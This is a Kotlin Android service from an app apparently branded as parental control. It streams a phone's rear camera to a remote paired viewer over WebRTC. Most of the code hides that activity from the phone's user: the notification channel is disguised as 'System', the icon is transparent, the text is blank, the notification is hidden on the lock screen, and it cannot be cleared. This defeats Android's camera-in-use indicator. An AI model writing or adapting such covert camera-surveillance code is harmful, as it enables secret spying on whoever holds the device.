package com.parentalcontrol.kidmonitor

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log

/**
 * Background foreground service that streams the kid's camera to the parent.
 * Notification uses IMPORTANCE_NONE + a fully transparent icon:
 * - No status bar icon (transparent drawable, zero alpha)
 * - No notification drawer entry (IMPORTANCE_NONE channel)
 * - No sound / vibration
 * - Blank title and text
 * - VISIBILITY_SECRET (hidden on lock screen)
 * The notification exists invisibly to keep the service alive on all Android versions.
 */
class CameraStreamService : Service() {

    private val prefs by lazy { getSharedPreferences(SetupActivity.PREFS_NAME, MODE_PRIVATE) }
    private var pairingKey = ""
    private var deviceId   = ""

    private var cameraClient: WebRTCCameraKidClient? = null

    override fun onCreate() {
        super.onCreate()
        pairingKey = prefs.getString(SetupActivity.KEY_PAIRING_KEY, "") ?: ""
        deviceId   = prefs.getString(SetupActivity.KEY_DEVICE_ID,   "") ?: ""

        startAsForeground()

        if (pairingKey.isNotEmpty() && deviceId.isNotEmpty()) {
            startCameraClient()
        } else {
            Log.e(TAG, "Missing pairingKey or deviceId — cannot start camera client")
        }
    }

    private fun startCameraClient() {
        Log.d(TAG, "Starting WebRTCCameraKidClient")
        cameraClient = WebRTCCameraKidClient(
            context     = this,
            deviceId    = deviceId,
            pairingKey  = pairingKey,
            facingFront = false
        )
        cameraClient!!.start()
    }

    // ─── Stealth foreground notification ─────────────────────────────
    private fun startAsForeground() {
        val nm = getSystemService(NotificationManager::class.java)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                CHANNEL_ID,
                "System",
                NotificationManager.IMPORTANCE_NONE  // Hidden: no drawer entry, no status bar icon
            ).apply {
                setShowBadge(false)
                setSound(null, null)
                enableLights(false)
                enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            nm?.createNotificationChannel(ch)
        }

        val notif = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_transparent) // Transparent icon — nothing shown in status bar
                .setContentTitle("")       // blank — nothing readable
                .setContentText("")
                .setVisibility(Notification.VISIBILITY_SECRET)
                .build()
                .also { it.flags = it.flags or Notification.FLAG_NO_CLEAR }
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
                .setSmallIcon(R.drawable.ic_transparent)
                .build()
                .also { it.flags = it.flags or Notification.FLAG_NO_CLEAR }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            startForeground(NOTIF_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
        } else {
            startForeground(NOTIF_ID, notif)
        }
    }

    override fun onDestroy() {
        cameraClient?.stop()
        cameraClient = null
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        private const val TAG        = "CameraStreamService"
        private const val CHANNEL_ID = "cam_svc_v2" // Bumped — forces fresh silent channel
        private const val NOTIF_ID   = 77

        fun start(context: Context) {
            val i = Intent(context, CameraStreamService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                context.startForegroundService(i)
            else
                context.startService(i)
        }

        fun stop(context: Context) {
            context.stopService(Intent(context, CameraStreamService::class.java))
        }
    }
}
